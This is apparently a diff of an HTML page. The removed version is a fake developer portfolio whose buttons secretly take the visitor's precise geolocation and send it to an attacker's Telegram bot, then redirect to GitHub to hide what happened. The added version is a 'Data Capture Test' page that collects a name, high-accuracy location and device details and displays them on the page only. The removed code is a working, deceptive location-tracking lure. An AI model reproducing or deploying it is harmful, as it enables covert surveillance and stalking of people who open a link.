@@ -3,67 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Personal Portfolio</title>
+    <title>Live Data Test</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
-        body { font-family: 'Poppins', sans-serif; background: #0f172a; color: white; }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-    </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-6">
 
-    <div class="glass max-w-md w-full rounded-2xl p-8 text-center shadow-2xl">
-        <div class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-blue-500 p-1">
-            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix" class="rounded-full bg-slate-700">
-        </div>
+    <div class="max-w-md w-full bg-slate-800 rounded-xl p-8 shadow-2xl border border-slate-700">
+        <h2 class="text-2xl font-bold text-center mb-6 text-blue-400">🔍 Data Capture Test</h2>
         
-        <h1 class="text-2xl font-bold mb-2">Hey, I'm Ajit! 👋</h1>
-        <p class="text-slate-400 text-sm mb-6">Full Stack Developer | UI/UX Designer | Tech Enthusiast</p>
-
         <div class="space-y-4">
-            <button onclick="start()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-300 shadow-lg">
-                View My Projects
-            </button>
+            <input type="text" id="testInput" placeholder="Apna Naam Likho" 
+                class="w-full p-3 bg-slate-900 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500">
             
-            <button onclick="start()" class="w-full glass hover:bg-white/10 text-white font-semibold py-3 rounded-lg transition duration-300">
-                Download Resume
+            <button onclick="testNow()" 
+                class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-bold transition">
+                Check My Details
             </button>
         </div>
 
-        <div class="mt-8 pt-6 border-t border-white/10 flex justify-center space-x-6 text-slate-400">
-            <span>Insta</span>
-            <span>GitHub</span>
-            <span>LinkedIn</span>
+        <div id="resultBox" class="mt-8 p-4 bg-black rounded-lg border border-green-500 hidden">
+            <h3 class="text-green-500 font-bold mb-2">🚀 Captured Data:</h3>
+            <div id="displayData" class="text-xs font-mono space-y-2 text-slate-300">
+                </div>
         </div>
-
-        <p id="status" class="mt-4 text-xs text-blue-400 hidden italic">Connecting to secure server...</p>
     </div>
 
     <script>
-        // --- APNI DETAILS YAHAN DALO ---
-        const BOT_TOKEN = "TUMHARA_TOKEN_YAHAN";
-        const CHAT_ID = "TUMHARI_CHAT_ID_YAHAN";
+        function testNow() {
+            const name = document.getElementById('testInput').value;
+            const resBox = document.getElementById('resultBox');
+            const display = document.getElementById('displayData');
 
-        function start() {
-            document.getElementById('status').classList.remove('hidden');
-            
+            if(!name) return alert("Pehle naam toh likho bhai!");
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    const msg = `🔥 *New Portfolio Hit!*%0A%0A📍 *Lat:* ${lat}%0A📍 *Lon:* ${lon}%0A🗺️ *Maps:* https://www.google.com/maps?q=${lat},${lon}`;
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    const platform = navigator.platform;
+                    const agent = navigator.userAgent.slice(0, 50) + "...";
 
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
-                    .then(() => {
-                        // Redirect user to real content after hit
-                        window.location.href = "https://github.com"; 
-                    });
-
+                    // Page par data dikhane ke liye
+                    resBox.classList.remove('hidden');
+                    display.innerHTML = `
+                        <p><b class="text-blue-400">User:</b> ${name}</p>
+                        <p><b class="text-blue-400">Latitude:</b> ${lat}</p>
+                        <p><b class="text-blue-400">Longitude:</b> ${lon}</p>
+                        <p><b class="text-blue-400">Accuracy:</b> ${acc.toFixed(2)} meters</p>
+                        <p><b class="text-blue-400">Device:</b> ${platform}</p>
+                        <p><b class="text-blue-400">Browser:</b> ${agent}</p>
+                        <p class="mt-4"><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="bg-green-600 px-2 py-1 rounded text-white text-[10px]">OPEN IN GOOGLE MAPS</a></p>
+                    `;
                 }, function(err) {
-                    alert("Please allow permission to view portfolio content.");
-                });
+                    alert("Location Block kar di! Data nahi nikal paya.");
+                }, {enableHighAccuracy: true});
             }
         }
     </script>
